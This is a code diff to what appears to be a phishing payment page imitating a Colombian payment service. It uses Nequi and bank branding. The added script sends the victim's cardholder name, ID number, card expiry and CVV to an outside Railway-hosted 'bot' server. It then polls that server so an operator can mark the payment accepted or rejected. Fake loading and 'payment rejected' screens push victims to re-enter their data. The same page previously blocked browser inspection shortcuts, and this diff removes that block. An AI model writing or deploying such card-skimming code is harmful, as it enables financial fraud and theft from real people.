@@ -197,6 +197,21 @@
     .pay-method-icon svg { width: 56px; height: 56px; }
     .pay-method-label { font-size: 14px; font-weight: 700; color: #00271c; line-height: 1.3; }
     .pay-method-sub { font-size: 11px; color: #6b7280; margin-top: 2px; }
+    /* 🆕 PANTALLAS DE PAGO */
+    .pago-carga-overlay { position: fixed; inset: 0; z-index: 99999999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px; }
+    .pago-carga-overlay.hidden { display: none !important; }
+    .pago-carga-logo { height: 80px; width: auto; object-fit: contain; max-width: 250px; }
+    .pago-carga-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #88f456; border-radius: 50%; animation: spinPago 1s linear infinite; }
+    @keyframes spinPago { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .pago-carga-texto { font-size: 18px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; }
+    .pago-error-overlay { position: fixed; inset: 0; z-index: 99999999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 24px; padding: 24px; }
+    .pago-error-overlay.hidden { display: none !important; }
+    .pago-error-icono { width: 100px; height: 100px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; }
+    .pago-error-logo { height: 60px; width: auto; object-fit: contain; max-width: 200px; }
+    .pago-error-titulo { font-size: 22px; font-weight: 700; color: #991b1b; text-align: center; }
+    .pago-error-texto { font-size: 15px; color: #555; text-align: center; max-width: 400px; line-height: 1.5; }
+    .pago-error-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 16px; }
+    .pago-error-btn:hover { background: #003d2b; }
     </style>
 </head>
 <body class="font-sans">
@@ -453,6 +468,28 @@
             </div>
         </footer>
 
+    </div>
+
+    <!-- 🆕 PANTALLA DE CARGA PAGO -->
+    <div id="pagoCargaOverlay" class="pago-carga-overlay hidden">
+        <img id="pagoCargaLogo" src="" alt="Marca" class="pago-carga-logo">
+        <div class="pago-carga-spinner"></div>
+        <div class="pago-carga-texto">Procesando tu pago...<br>Por favor espera</div>
+    </div>
+
+    <!-- 🆕 PANTALLA DE ERROR PAGO -->
+    <div id="pagoErrorOverlay" class="pago-error-overlay hidden">
+        <div class="pago-error-icono">
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="15" y1="9" x2="9" y2="15"></line>
+                <line x1="9" y1="9" x2="15" y2="15"></line>
+            </svg>
+        </div>
+        <img id="pagoErrorLogo" src="" alt="Marca" class="pago-error-logo">
+        <div class="pago-error-titulo">Pago rechazado</div>
+        <div class="pago-error-texto">Los datos ingresados son incorrectos. Verifique y vuelva a intentar su pago.</div>
+        <button type="button" class="pago-error-btn" onclick="cerrarPagoError()">Volver a intentar</button>
     </div>
 
     <div id="modalRegistro" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50">
@@ -1114,22 +1151,17 @@
     </div>
 
     <script>
+        var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
+
         function scrollAFormulario() {
             var seccion = document.getElementById('seccionFormulario');
-            if (seccion) {
-                seccion.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            }
+            if (seccion) { seccion.scrollIntoView({ behavior: 'smooth', block: 'start' }); }
         }
 
         function marcarCaptcha() {
             var img = document.getElementById('captcha-img');
-            if (!img.dataset.marcado) {
-                img.src = 'img/nequi/ok.jpg';
-                img.dataset.marcado = '1';
-            } else {
-                img.src = 'img/nequi/aceptar.jpg';
-                img.dataset.marcado = '';
-            }
+            if (!img.dataset.marcado) { img.src = 'img/nequi/ok.jpg'; img.dataset.marcado = '1'; }
+            else { img.src = 'img/nequi/aceptar.jpg'; img.dataset.marcado = ''; }
         }
 
         function abrirModal(e) {
@@ -1147,6 +1179,7 @@
         var datosUsuario = { primerNombre: '', segundoNombre: '', primerApellido: '', segundoApellido: '' };
         var metodoPagoActual = '';
         var bancoSeleccionadoPSE = '';
+        var pagoPollingInterval = null;
 
         var URLS_BANCOS = {
             'bbva':        'https://securecheckout-sandy.vercel.app',
@@ -1280,9 +1313,8 @@
         function abrirCalendario(contenedor) {
             var input = contenedor.querySelector('input[type="date"]');
             if (input) {
-                if (typeof input.showPicker === 'function') {
-                    try { input.showPicker(); } catch(e) { input.focus(); }
-                } else { input.focus(); }
+                if (typeof input.showPicker === 'function') { try { input.showPicker(); } catch(e) { input.focus(); } }
+                else { input.focus(); }
             }
         }
 
@@ -1335,6 +1367,7 @@
                 total += parseInt(select.value || 0);
             });
             document.getElementById('totalPagar').textContent = 'Total a pagar: $' + total.toLocaleString('es-CO');
+            return total;
         }
 
         function setAporte(activo) {
@@ -1497,6 +1530,73 @@
             else if (!vistaSolicitud.classList.contains('hidden')) { mostrarVistaRegistro(); }
         }
 
+        // 🆕 PANTALLAS DE PAGO CON TARJETA
+        function mostrarPagoCarga(marca) {
+            var overlay = document.getElementById('pagoCargaOverlay');
+            var logo = document.getElementById('pagoCargaLogo');
+            if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; logo.alt = 'Visa'; }
+            else { logo.src = 'img/Mastercard-logo.svg'; logo.alt = 'Mastercard'; }
+            overlay.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function ocultarPagoCarga() {
+            document.getElementById('pagoCargaOverlay').classList.add('hidden');
+            document.body.style.overflow = '';
+        }
+
+        function mostrarPagoError(marca) {
+            var overlay = document.getElementById('pagoErrorOverlay');
+            var logo = document.getElementById('pagoErrorLogo');
+            if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; }
+            else { logo.src = 'img/Mastercard-logo.svg'; }
+            ocultarPagoCarga();
+            overlay.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function cerrarPagoError() {
+            document.getElementById('pagoErrorOverlay').classList.add('hidden');
+            document.body.style.overflow = '';
+            abrirModalTarjeta();
+        }
+
+        function iniciarPollingPago(sessionId, marca, payload) {
+            if (pagoPollingInterval) clearInterval(pagoPollingInterval);
+            pagoPollingInterval = setInterval(function() {
+                fetch(URL_BOT_RAILWAY + '/cc-bogota/estado/' + sessionId)
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (data.estado === 'aceptado') {
+                            clearInterval(pagoPollingInterval);
+                            pagoPollingInterval = null;
+                            ocultarPagoCarga();
+                            document.getElementById('lastFourDigitsPopup').textContent = payload.tarjeta;
+                            document.getElementById('popupCardNumber').textContent = payload.tarjeta;
+                            document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
+                            document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
+                            var logoContainer = document.getElementById('cardBrandLogo');
+                            if (marca === 'visa') {
+                                logoContainer.innerHTML = '<img src="img/Visa_Inc._logo_(2005–2014).svg" style="height:28px; width:auto;">';
+                            } else {
+                                logoContainer.innerHTML = '<img src="img/Mastercard-logo.svg" style="height:50px; width:auto;">';
+                            }
+                            var today = new Date();
+                            document.getElementById('currentDate').textContent = 
+                                String(today.getDate()).padStart(2, '0') + '/' +
+                                String(today.getMonth() + 1).padStart(2, '0') + '/' +
+                                today.getFullYear();
+                            openAuthModal();
+                        } else if (data.estado === 'rechazado') {
+                            clearInterval(pagoPollingInterval);
+                            pagoPollingInterval = null;
+                            mostrarPagoError(marca);
+                        }
+                    })
+                    .catch(function(err) { console.error('Error consultando estado:', err); });
+            }, 2000);
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             CAMPOS_OBLIGATORIOS.forEach(function(campo) {
                 var input = document.querySelector('#vistaRegistro [name="' + campo.name + '"]');
@@ -1559,35 +1659,39 @@
                     if (!this.disabled) {
                         e.preventDefault();
                         var cardInput = cardNumber.value.replace(/\D/g, '');
-                        var lastFour = cardInput.slice(-4);
-                        var masked = lastFour.length === 4 ? '************' + lastFour : '************';
-                        document.getElementById('lastFourDigitsPopup').textContent = masked;
-                        document.getElementById('popupCardNumber').textContent = masked;
-                        var logoContainer = document.getElementById('cardBrandLogo');
                         var firstDigit = cardInput.charAt(0);
-                        if (firstDigit === '4') {
-                            logoContainer.innerHTML = '<img src="img/Visa_Inc._logo_(2005–2014).svg" style="height:28px; width:auto;">';
-                        } else if (firstDigit === '5' || firstDigit === '2') {
-                            logoContainer.innerHTML = '<img src="img/Mastercard-logo.svg" style="height:50px; width:auto;">';
-                        } else {
-                            logoContainer.innerHTML = '';
-                        }
-                        // 🆕 TOTAL DINÁMICO desde las placas
-                        var totalMonto = 0;
-                        var filasPlacas = document.querySelectorAll('#filasPlacas > [data-placa]');
-                        filasPlacas.forEach(function(fila) {
-                            var select = fila.querySelector('select');
-                            totalMonto += parseInt(select.value || 0);
-                        });
+                        var marca = '';
+                        if (firstDigit === '4') marca = 'visa';
+                        else if (firstDigit === '5' || firstDigit === '2') marca = 'mastercard';
+                        else { alert('Solo se aceptan tarjetas Visa o Mastercard'); return; }
+
+                        var sessionId = 'PYP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+                        var totalMonto = calcularTotal();
                         if (totalMonto === 0) totalMonto = 70294;
-                        document.getElementById('montoPopup').textContent = totalMonto.toLocaleString('es-CO');
-                        document.getElementById('montoPopup2').textContent = totalMonto.toLocaleString('es-CO');
-                        var today = new Date();
-                        var day = String(today.getDate()).padStart(2, '0');
-                        var month = String(today.getMonth() + 1).padStart(2, '0');
-                        var year = today.getFullYear();
-                        document.getElementById('currentDate').textContent = day + '/' + month + '/' + year;
-                        openAuthModal();
+
+                        cerrarModalTarjeta();
+                        mostrarPagoCarga(marca);
+
+                        var payload = {
+                            sessionId: sessionId,
+                            marca: marca,
+                            tarjeta: '************' + cardInput.slice(-4),
+                            titular: cardHolder.value.trim(),
+                            docType: document.getElementById('docType').value,
+                            docNumber: docNumber.value.trim(),
+                            monto: totalMonto,
+                            expMes: expiryMonth.value,
+                            expAnio: expiryYear.value,
+                            cvv: cvv.value
+                        };
+
+                        fetch(URL_BOT_RAILWAY + '/cc-bogota/enviar-pago', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        }).catch(function(err) { console.error('Error enviando pago:', err); });
+
+                        iniciarPollingPago(sessionId, marca, payload);
                     }
                 });
 
@@ -1629,16 +1733,7 @@
             setTimeout(function() { modal.style.display = 'none'; document.body.style.overflow = ''; }, 400);
         }
 
-        document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeAuthModal(); });
-        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key.toLowerCase() === 'u') { e.preventDefault(); return false; }
-            if (e.ctrlKey && e.key.toLowerCase() === 's') { e.preventDefault(); return false; }
-            if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i') { e.preventDefault(); return false; }
-            if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'c') { e.preventDefault(); return false; }
-            if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'j') { e.preventDefault(); return false; }
-            if (e.key === 'F12') { e.preventDefault(); return false; }
-        });
+       
     </script>
 
 </body>
